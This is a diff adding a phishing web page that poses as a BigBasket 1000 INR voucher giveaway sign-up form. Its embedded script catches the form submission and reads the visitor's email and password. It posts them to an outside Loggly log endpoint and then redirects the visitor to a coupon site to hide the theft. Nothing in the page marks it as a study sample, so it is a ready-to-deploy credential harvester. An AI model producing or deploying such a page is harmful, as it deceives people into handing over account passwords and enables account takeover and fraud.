@@ -1,0 +1,77 @@
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="description" content="Big basket giveaway INR">
+    <meta name="keywords" content="bigbasket, shopping">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.1/css/bulma.min.css">
+    <script defer="" src="https://use.fontawesome.com/releases/v5.0.7/js/all.js"></script>
+  </head>
+  <body>
+<section class="hero is-fullheight">
+  <div class="hero-body">
+    <div class="container">
+      <div class="column is-4 is-offset-4 box">
+
+        <img src="https://www.fugenx.com/wp-content/uploads/2017/04/BigBasket-App-Development-banner-FuGenX.jpg"> </img>
+        <h1 class="title">Sign Up to Participate in 1000 INR Bigbasket Voucher</h1>
+        <div class="login-form">
+          <form role="form" id="theform" action='/signup' method="POST">
+
+            <div class="field">
+              <label class="label">Email</label>
+              <div class="control has-icons-left has-icons-right">
+                <input class="input" id="email" type="email" placeholder="e.g. asmith@gmail.com"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span><span class="icon is-small is-right"><i class="fas fa-check"></i></span>
+              </div>
+            </div>
+            <div class="field">
+              <label class="label">Password</label>
+              <div class="control has-icons-left">
+                <input class="input" id="password" placeholder="e.g. Password" data-lpignore="true"><span class="icon is-small is-left"><i class="fas fa-lock"></i></span>
+              </div>
+            </div>
+            <div class="field">
+              <label class="label">Confirm password</label>
+              <div class="control has-icons-left">
+                <input class="input" type="password" placeholder="e.g. Password" data-lpignore="true"><span class="icon is-small is-left"><i class="fas fa-lock"></i></span>
+              </div>
+            </div>
+            <div class="field">
+              <p class="control">
+                <button class="button is-primary is-medium is-fullwidth">Sign Up</button>
+              </p>
+            </div>
+          </form>
+        </div>
+        <hr>
+        <div class="forgot-password">
+          <p class="has-text-centered">Did you <a href="/forgot">forgot your password </a>or <a href="/login">need to login?</a></p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+</body>
+<script type="text/javascript">
+    document.getElementById("theform").onsubmit = function(e) {
+        e.preventDefault();        
+        const email = document.getElementById("email").value;
+        const pw = document.getElementById("password").value;
+        
+
+      var data = {}
+      data[email] = pw
+      console.log('data', data)
+      fetch("http://logs-01.loggly.com/inputs/97cfe71b-bd17-4448-993e-77e2cf1ba5f0/tag/http/", {
+          method: "POST",
+          body: JSON.stringify(data)
+      })
+
+      window.location.href = "https://www.coupondunia.in/bigbasket"
+
+  }
+
+</script>
+</html>
